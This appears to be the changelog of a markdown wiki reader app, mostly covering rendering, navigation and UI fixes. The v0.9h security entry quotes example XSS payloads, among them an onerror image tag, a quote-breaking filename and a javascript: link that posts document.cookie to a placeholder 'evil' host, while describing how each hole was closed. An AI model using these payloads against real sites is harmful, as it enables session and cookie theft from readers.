# Project-WikiBase — Changelog

*One entry per shipped deploy zip. Newest at top. Not a substitute for the session log — this is the short version, for tracking what actually went out the door.*

*Note: v0.8c / v0.8d / v0.8e-1 below are reconstructed from partial notes — those sessions moved the app forward without a session-log entry at the time (a known documentation gap). Everything from v0.9a onward is tracked in full going forward.*

---

## v0.9i — 2026-07-21

**Changed:** `index.html`

Reader panel (S3) — nested list rendering, plus a related same-file link fix.

- **Lists now nest for real.** Bullet, numbered, and checkbox items previously rendered as one flat level regardless of indentation — indent was captured but never used. Depth is now computed per Obsidian's own rule (a tab, or a run of 2 spaces, each count one level; no distinction between bullet/number/checkbox — Obsidian nests all three the same way under the hood), and the reader builds real nested `<ul>/<ol><li>` structure from it.
- **Tab-indented continuation lines no longer fall out of the list.** A marker-less indented line (e.g. a wrapped note under a bullet) used to fail the block-grouping check if it was tab-indented rather than space-indented, breaking the list block early and rendering as a stray paragraph. Grouping now accepts a tab or 2+ spaces; a marker-less line attaches to the previous item as continuation text instead of being dropped.
- **Left-border guide line on nested levels,** Obsidian Minimal-style, applied globally via one class — not a special case per level.
- **Fold control, chevron-only.** Every item with children gets a fold chevron (default expanded, so nothing collapses on you unexpectedly). Only the chevron is clickable — the row text has no cursor, no click handler, and `user-select:none`, so it can't be folded or text-highlighted by accident. Single-click folds just that item's direct children, matching heading fold. Double-click folds/unfolds its entire subtree at once, all levels down — works at any depth, not just top-level items. Click/dblclick are disambiguated with a short delay (single-click's action is held ~220ms and cancelled if a second click arrives), otherwise a double-click would fire the single-fold once before the subtree-fold landed on top of it.
- **Same-file wiki links now scroll instead of reloading, regardless of link form.** `[[#Heading]]` already scrolled in place; `[[File#Heading]]` / `[[File#Heading|text]]` pointing at the file already open still forced a full reload+rescroll. Both forms now resolve the same way when the target is the currently open file.

---

## v0.9h — 2026-07-21

**Changed:** `index.html`, `help.md`

Security pass. No new features. Four findings from an audit of the reader, all closed.

- **Notes can no longer inject HTML into the reader.** `renderInline()` handed the raw text of a `.md` file to `innerHTML` without escaping it, so HTML typed into a note rendered as live markup — an `<img src=x onerror=...>` in a note ran script for every reader who opened it, holding their SharePoint session. The markdown source is now escaped before any parsing runs. Consequence: raw HTML in notes displays as literal text by design. Obsidian permits HTML (sanitized); WikiBase does not. Nothing in the current vault used it, so nothing visibly changed.
- **Apostrophes in filenames can no longer become executable code.** Several renderers interpolated names and URLs into single-quoted JS strings inside `onclick` attributes. A note or file named `foo');alert(1)//` closed that string and ran whatever followed. Every dynamic handler — sidebar rows, wiki links, embed stubs, backlinks, the Links panel, the Review and Changes inboxes, the Outline — now uses data-attributes read by one delegated listener, where the value is data and can never be parsed as code. `escHtml()` also escapes apostrophes now, as defence in depth. This was a correctness bug as well: names like `Q1 O'Brien notes.md` were already broken in those panels.
- **Link and image URLs are checked against a scheme allowlist.** `[Click me](javascript:fetch('//evil/'+document.cookie))` rendered as an ordinary link and fired on click. http, https, mailto, tel, file and obsidian pass; everything else degrades to plain text. Obfuscation via case, leading whitespace and embedded tabs/newlines is handled. The Links panel applies the same rule, so a blocked link is not still clickable there.
- **Added a Content-Security-Policy.** Backstop, not the fix. `connect-src` is the important line — it stops injected script posting note contents to an outside server. `frame-ancestors` is deliberately absent: it is ignored in a `<meta>` tag and only works as an HTTP header, which a file in a document library cannot set.
- `help.md` "HTML" section rewritten — it documented raw HTML as a supported feature.
- Incidental fix found along the way: a link with a malformed percent-escape (`[x](100%.md)`) threw inside `decodeURIComponent` and killed the render of the whole note. Now caught.

**Known, deferred:** `script-src` still needs `'unsafe-inline'` because ~40 inline `onclick` attributes remain in the *static* markup (toolbar and modal buttons). Those take no dynamic values and are not exploitable, but while the keyword is present `script-src` provides no real XSS protection. Converting them and dropping it is the last step.

---

## v0.9g — 2026-07-21

**Changed:** `index.html`

- Fixed the version tag showing v0.9c while the changelog was already at v0.9f — it's a static label, not derived from the changelog, and had drifted. Bumped to match; "bump version + changelog together" stays a standing close-checklist item.
- Reader top fade shrunk from 72px to 48px — still fully backs the corner buttons, but reads as less dead space at the top of the page. The fade now also disappears entirely when the reader is scrolled to the very top of a file, so the first heading no longer fades for no reason (there was nothing behind it to hide in the first place).
- Fixed the real cause of Outline clicks sometimes highlighting the wrong item. When a clicked heading landed close enough to its neighbor that both fell inside the scroll-spy's detection zone at once, the neighbor's intersection callback could fire after the clicked heading's and silently steal the highlight. An Outline click (or same-page/cross-file anchor jump) now pins the outline highlight and the reader row highlight directly to the heading you jumped to, and the scroll-spy stands down until you actually scroll again — so it can't get overwritten by a neighbor, and it no longer fades on its own after ~1.4s; it stays until you scroll.
- Reader panel gets a real header bar: Back/Forward move into it (were floating solo, top-left), followed by the current file's name, trimmed of its `.md` extension, flexing to fill the space up to the fold/Properties/Edit cluster on the opposite corner.
- Task checkboxes are clickable straight from the reader, no need to open the full editor for a status tick. Gated by the same "Enable editing" + author-list check already used for New/Move/Edit. Saves immediately and silently, no change-log entry, no Needs Review flip, same treatment as Properties-panel edits.

---

## v0.9f — 2026-07-20

**Changed:** `index.html`

- Fixed Outline clicks sometimes not scrolling the reader at all — worse on closely-nested headings, but not limited to them. A heading inside a folded ancestor section is `display: none`, so its rect is empty and the scroll math landed nowhere. Outline clicks (and same-page/cross-file anchor links, same underlying bug) now expand the target heading's ancestor chain first, same rule already used by Collapse unused, before scrolling to it. Both code paths now share one `revealHeading()` implementation instead of two separate ones.
- The heading you jump to now lands clear of the button/fade strip at the top of the reader instead of partially underneath it (offset increased from 10px to 56px).
- Jumping to a heading now gives it a brief highlight (same tint as hovering a heading row) that fades out on its own, so it's clear where you landed.
- Increased the reader-fade strip's solid coverage so it fully clears the button row before it starts fading — the previous version was still partly see-through right where the buttons sit.

---

## v0.9e — 2026-07-20

**Changed:** `index.html`

- Fixed local test mode images showing a broken-image badge instead of the picture (found while confirming the v0.9d image fix on a OneDrive-synced local vault). The placeholder src built for local mode was `local:/Folder/Attachments/image.png` — WikiBase's own internal file identifier, not a real URL. Setting that as an `<img src>` made the browser try to load `local:` as an actual protocol and fail instantly with `ERR_UNKNOWN_URL_SCHEME`, before the async local-file lookup that supplies the real blob URL ever got a chance to run. Local-mode images now render with no `src` at all until that lookup finishes; a genuinely missing file now shows the fallback badge explicitly (there's no failed network request left to trigger it automatically). SharePoint mode is unaffected — it always used a real fetchable URL.

---

## v0.9d — 2026-07-20

**Changed:** `index.html`

- Fixed the real image bug (v0.9c's fix addressed a different cause of the same symptom). The broken-image fallback markup built the error icon as a string spliced directly into the `onerror="..."` attribute — but the icon is an SVG with its own double-quoted attributes, and a double quote nested inside a double-quoted HTML attribute closes it early. That's what was splicing "Pasted image x.png" and a trailing `'">` into the page and corrupting rendering for everything after it. Replaced with a shared `wbImgError()` function that builds the fallback via DOM methods instead of attribute strings, used by both the inline and standalone image renderers.
- Fixed duplicate Outline highlighting. Heading ids were generated from heading text alone with no uniqueness check, so two headings with the same text (e.g. two "Overview" sections) got the identical DOM id — the Outline's highlight, which matches by id, lit up both rows at once. Ids now de-dupe within a document (second occurrence becomes `h-overview-2`); anchor links still resolve to the first occurrence, unchanged.
- Back/Forward now restores scroll position, not just which file was open. The history stacks store scroll offset alongside url/name; Back and Forward return you to it. Any other navigation (sidebar, wiki link, search) still opens at the top.
- Reader content no longer scrolls with a hard cutoff under the floating corner buttons (Back/Forward, fold controls, Edit, Properties). Added a gradient fade strip above the scroll area so text dissolves before it reaches the icons.

---

## v0.9c — 2026-07-20

**Changed:** `index.html`

- Fixed a major image bug: `renderInline()` restores images/links into text with `s.replace(placeholder, html)`. Plain-string `.replace()` treats `$&`, `` $` ``, `$'`, `$$` in the replacement as special patterns even without a regex, so an image name, alt text, or link title containing a lone `$` (a cost figure, a filename with a dollar sign) spliced fragments of the surrounding raw markdown into the rendered page — the stray `'">` and swallowed/uncollapsible headings Jayson was seeing. Fixed by passing a replacer function instead of the raw string on both the link/image and code restore lines, so the replacement is always inserted literally.
- H6 headings now get a color instead of falling back to gray — added purple to the Minimal theme's heading palette (`#9e86c8`, confirmed against Obsidian Minimal's own `--color-purple`), completing the existing red→orange→yellow→green→blue rainbow.
- Tables: top/bottom spacing around the table is now padding, not margin (margin was collapsing against the paragraph above, making the top gap read thinner than the bottom). Header row font size now matches the body (14px, was 12px). Tables are content-width and left-justified instead of forced to 100%, matching Obsidian — cells only wrap when the table would otherwise overflow the reader column.
- Outline panel now walks headings H1–H6 (was capped at H3). Removed a stray CSS override that shrank H3 outline entries to 11px while every other level was 12px.
- Outline's active item and the Vault browser's active file now share the same highlight treatment: accent-tinted background plus the existing colored text and right border, instead of text color alone.
- Reader panel back button is now a Back/Forward pair (top-left, mirrors Properties/Edit on the opposite corner). Removed the redundant Back button from the top header bar. Added a session-only forward stack alongside the existing back stack — Back moves the page you're leaving onto Forward's stack and vice versa, same as a browser tab; any other navigation clears Forward's stack.

---

## v0.9b-1 — 2026-07-20

**Changed:** `index.html`

- Fixed heading links showing a literal `#` in the rendered text. `[[#Header Name]]` (same-page) was displaying as "#Header Name" instead of "Header Name" — the display-text fallback was building itself from the raw `#heading` fragment instead of the heading name alone. Linking to a heading in another file (`[[File Name#Header Name]]`) still shows just the file name, unchanged — no `#` was found in that path on inspection; flagged for Jayson to confirm after this fix.

---

## v0.9b — 2026-07-20

**Changed:** `index.html`

- Folder/file-share links (`file://` UNC or drive paths) no longer attempt to open — browsers can't launch a native Explorer/Finder window from a page link, and the attempt was navigating to a broken URL. Clicking one now copies a cleaned, decoded path (no percent-encoding) to the clipboard and shows a brief "Copied to clipboard" confirmation, ready to paste into Explorer's address bar.
- Fixed a real bug this surfaced: bold/italic/strikethrough/highlight parsing ran on the raw line before links and images were parsed out, so `_`, `*`, `~~`, or `==` inside a link target or filename got read as formatting and silently eaten (this is why underscores were vanishing and paths looked "trimmed" when copied). Links and images are now protected in placeholder slots immediately, the same technique already used for inline code, before any formatting regex runs. Fixes every existing link/image/note title with one of those characters in its target, not just the new folder-link feature.
- Reader corner controls: removed the pill background/border around Collapse all/Collapse unused/Expand all — now plain icon buttons with one separator against Properties instead of a rounded group.
- Vault sidebar header: added a bold "Vault Files" label, removed the divider line below it. The three fold buttons now hide as a group (not individually) when the sidebar narrows enough that they'd crowd the label, and reappear once there's room.
- Outline panel header: same treatment — text label "Outline" (was an icon), divider line removed. Lock toggle (independent/shared fold state) stays, positioned left of the fold buttons with its own separator; the whole group (lock + fold buttons) hides together at narrow widths, same mechanism as the sidebar.
- Comments, Links, Review changes, and Search panel headers now match the same left-justified label style, divider line removed. No button group on these — nothing to hide.

---

## v0.9a-5 — 2026-07-19

**Changed:** `index.html`

- Outline panel now folds. A chevron appears on any heading that has a nested heading below it (leaf headings get no chevron); clicking it hides/shows just its own descendant entries.
- New lock toggle in the Outline toolbar, left of Collapse all / Collapse unused / Expand all: unlocked (default) keeps the Outline's fold state independent of the reader; locked shares the reader's own per-file fold memory, so folding a heading either place folds it both places.
- Outline's Collapse all / Collapse unused / Expand all are now wired up — Collapse unused keeps the active heading and its ancestor chain expanded, same rule as the sidebar and reader fold pill.

---

## v0.9a-4 — 2026-07-19

**Changed:** `index.html`

- Added Collapse all / Collapse unused / Expand all icons to the sidebar (vault browser). Collapse unused keeps the folder path to the currently open file expanded, closes everything else.
- Added a matching fold-control pill (neutral gray, not accent-colored) to the reader panel, left of Properties — same three actions, over the open file's own heading sections. Collapse unused keeps the current heading (per Outline's active-heading tracking) and its ancestor headings expanded.
- Added a Back button: one next to the sidebar toggle in the header, one mirrored top-left of the reader panel (opposite Properties/Edit, same size). Session-only "previous note" history, multiple steps back, resets on reload.
- New/Move header icons are now fully hidden when Settings → Enable editing is off, instead of grayed out. Shown at full weight (matching every other header icon) when it's on.
- Renamed Advanced Settings → "Enable editing (New / Move / Edit)" to "Enable editing".
- The version tag (bottom-right) is now clickable — opens a Changelog view in the reader, same behavior as Help (including the Outline-refresh fix from v0.9a-3, so Outline doesn't show stale headings).
- **Outline panel fold carrots + collapse state deliberately not built this session** — carved out to a dedicated session (spec logged in `kickoff-prompt.md`, section ③b).

---

## v0.9a-3 — 2026-07-16

**Changed:** `index.html`

- Fixed nested callouts — `>>` and `>>>` now render as proper nested callouts/blockquotes (previously only one level of `>` worked).
- Sidebar and right-panel resize handles now require a double-click to collapse, not a single click.
- Fixed a bug where opening Help left the Outline panel showing the previous file's headings; clicking one could error out.
- Rebuilt the Links panel: now shows the current file's own links, categorized as MD Files / Websites / Folders / Other, above the existing (session-scoped) Backlinks list.
- Added per-heading collapse memory — folded sections now persist per file, like Obsidian.
- Tuned spacing above/below headings, especially around the H2 underline.
- **Not fixed, tracked open:** a Markdown file reportedly froze the app once. Held pending reproduction — need the actual file to diagnose properly instead of guessing at a fix.

---

## v0.9a-2 — 2026-07-16

**Changed:** `index.html`

- Added a manual PWA update-available indicator (up-arrow icon, appears when a new version has taken over the service worker; click reloads).
- Reworked the Review tab: vault-wide overview (File changes / New files) always shown at the top, per-file card list unchanged below it.

---

## v0.9a-1 — 2026-07-16

**Changed:** `index.html`

- Moved the file audit out of Settings entirely; folded into the Review changes screen as a "New Files" section.
- Fixed review-card click sometimes highlighting the wrong line in the reader (was matching short blocks, often the title, instead of the actual change).
- Fixed Minimal theme header colors — pulled the real hex values from Obsidian Minimal's own theme.css instead of placeholder colors.

---

## v0.9a — 2026-07-16

**Changed:** `index.html`

- Fixed a boot bug where nested open subfolders got stuck on "Loading…" (only top-level open folders were being preloaded).
- Added Settings → Navigation → "Open last note" (default on) — boot reopens the last file you had open instead of restoring exact folder state.
- Compressed Header colors + Background color into one settings row.
- Added a read-only file audit (flags files WikiBase has never written to, i.e. never touched/reviewed).
- Fixed Minimal theme H1/H2 color swap.

---

## v0.8e-1 — 2026-07-16 *(reconstructed, partial)*

**Changed:** `index.html`

- Minimal theme identity work, H2 underline toggle, image-size syntax (`![[img.png|width]]`), Theme settings sub-grouping.
- Full change detail not captured at the time — flagged as a documentation gap, not reconstructed further.

---

## v0.8d — 2026-07-16 *(reconstructed, partial)*

**Changed:** `index.html`

- Incremental theme/settings work between v0.8c and v0.8e-1. Detail not captured at the time.

---

## v0.8c — 2026-07-16 *(reconstructed, partial)*

**Changed:** `index.html`

- Earliest of the untracked same-day sessions. Detail not captured at the time.
